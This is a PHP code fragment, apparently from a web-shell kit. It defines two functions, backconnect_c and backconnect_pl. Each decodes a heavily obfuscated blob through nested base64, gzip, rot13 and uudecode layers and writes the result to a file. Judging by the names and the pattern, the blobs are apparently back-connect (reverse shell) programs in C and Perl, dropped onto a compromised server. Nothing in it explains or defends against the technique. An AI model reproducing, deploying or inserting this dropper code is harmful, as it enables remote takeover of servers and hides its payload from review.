function backconnect_c($file){
$backconnect='Dc5XomtAAADQf7sQot7ovQwRndEZQbD/Vbz3dz4PBLHtxFvekWIv7B2XQ8O07lXS7zXkB7J4s/z7wB3SUBvabDtq9n+X0QyaX5QgwyA4bmVHRMG/eX8cdwRjPBNjmP8SOU0/DPsaTB/vzT55zO7hJa9Fv2vTGLhXPU8YZIvP6nPLuTqZAHrmq+Fcc85Pd9k+aWBVGsDHAUHFtOu9hLwiqYq7WZ6SZ+D3xCB3l/BbydFECEQW8oaeRsetXrlbgPDNl6x+2SXN5/q66NZjiR503aLaVrOKfGkYpGA2SeeuSPVhlY7v6SWp9ZPSy9yTtfG3V7rym4A79L7bRtltBTp3Y9Ysfgmqj8FFs/uLp1VmJQPk4X+N4JfbcqLkr0bNhyGr+7/SnHbVeLIFSYhs7/qRrOovSMfg/i29TViZ7/ZTnJA+ovFqjmsrkWOEnA7HxlW8WW/DV7QW+7nJTnEprU/J1jURGCz3VUSthsSQB2ID4MNiwTkVbAOKZFHfTCidZzZRD5Bw0R5AJme3wzitZ9m8OAzW2aF48JAT2V6JYTYoWkqHJCxBOilLzrCpBnUffjhac1bxSk1KfSLVGpmdtmgMOqhpwpXUTqcnP2QuOANnRq5SDfiG1pe4hFxViwLgE2YsOu+NXEKR1XK+Q2JMMJhBO/3GAx+tIKO47KgoF59Zdanl4BFHdPe/H7+4zmDPpjfOR5ZW6yAmSjduVIfB9u8A3q0jhyx6Kn3quxGsfeCJv5YMCOLsrXsG9uA+tHvYieAnhSt0O0eq64MrMfu+Ed3xR5C1s1XWtXoYJpMviwvQ8d3P33VL943d2D8=';
$text=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($backconnect)))))));
if($filez = @fopen($file,"w")){
@fputs($filez,$text);
@fclose($file);} 
}

function backconnect_pl($file){
$backconnect='DdBHgoIwAADAO7+QoiIYkU4ISFF6DCC9//8Vuw+Yy+DQEoR3WpQsx+9a4ad2BX/i+XDLlL0cEj841zdUTpAEIWu++sZcWKRrmV67gjFRGDpLCBnmu9XCZSjPwSfAkclEE1CfA82HN47PDXFSPHA9JFvwSyY9gdUJSwUmI4XHDdzl8SzzzRFocG3MkDh6CUl/nbnvNqmzo1QwH+s+Qq4ehaDNu6NIxxkwOKLwZPQMDgTvcwNwtM78GnEWI1r7F9Az+9PucLMEwJ5U7hE1hOlrBMdA8uPnELsNhcnt6vn17Jlr48Vt9ZR5mctd/fJojehj8O21ydXs9DLUWrA5reRmxHuG5asVQYjCa/0yf7oE6h637+FMWCY0Qd8DQ+yX5OiX6meXGsIk03SgzsONeFpqLdGKpcSg8GMAiY7oV1UoZRBcoAAWf1oE5qjytrqLG0DSzi9DdIKmcoyJ68pFkJpv+YEcncIHOfx7B6DTo88iH3G8ikuTuBV+dWWOPufOk2GIgbhAPwUZ/XAnJurfCbh32b+2fXramIaOtRArzPbbTXfjqmmVcKbOIgmr2+5yFlnZU4Lju978t06a19VSUtH/a/v2vT4V7jV1qbEXik63/Gg/Ssd22sXsiLnHnwFtSMvi1d4NkR8KQjuNcq+bneL2XcHzEx3UQf0B';
$text=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($backconnect)))))));
if($filez = @fopen($file,"w")){
@fputs($filez,$text);
@fclose($file);} 
}
